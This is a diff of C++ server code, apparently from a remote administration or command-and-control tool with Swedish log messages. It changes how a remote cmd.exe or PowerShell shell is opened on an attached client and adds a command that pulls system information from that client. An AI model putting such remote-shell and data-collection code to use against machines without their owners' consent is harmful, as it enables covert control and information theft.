@@ -193,7 +193,7 @@ func_map server::get_client_commands()
 			std::string cwd = R"(C:\Windows\System32)";
 			message msg{ "shell-init", "" };
 			if (args == "cmd") {
-				shell = R"(C:\Windows\System32\cmd.exe /K ping 127.0.0.1 -n 5)";
+				shell = R"(C:\Windows\System32\cmd.exe)";
 			}
 			else if (args == "powershell") {
 				shell = R"(C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe)";
@@ -275,7 +275,7 @@ func_map server::get_client_commands()
 								console_log.Log<LOG_INFO>(logger() << str_time() << " shell() - " << Error(10070, "konsolen dog").to_string() << "\n");
 								dead = true;
 							}
-							else {
+							else { // => skrivning lyckades
 								console_log.Log<LOG_INFO>(logger() << str_time() << " write-shell() - " << Error(0, "skrev " + data + " till konsolen").to_string() << "\n");
 							}
 						}
@@ -285,6 +285,8 @@ func_map server::get_client_commands()
 						}
 					}
 
+					
+
 					console << "\n\n(Status) Success: Process Exited\n";
 				}
 				else {
@@ -293,6 +295,19 @@ func_map server::get_client_commands()
 					return;
 				}
 
+			}
+		}},
+
+		{ "get-info", [&](std::string args){
+			for (auto& [key, value] : attached->computer_information) {
+				if (send(*attached, {"info", key})) {
+					packet response = wait_response("response|info", attached);
+
+					console_log.Log<LOG_VERBOSE>(logger() << str_time() << " request-info(" << key << ") => " << response.data << "\n");
+					console << str_time() << " request-info(" << key << ") => " << response.data << "\n";
+
+					delete_packet(response);
+				}
 			}
 		}}
 
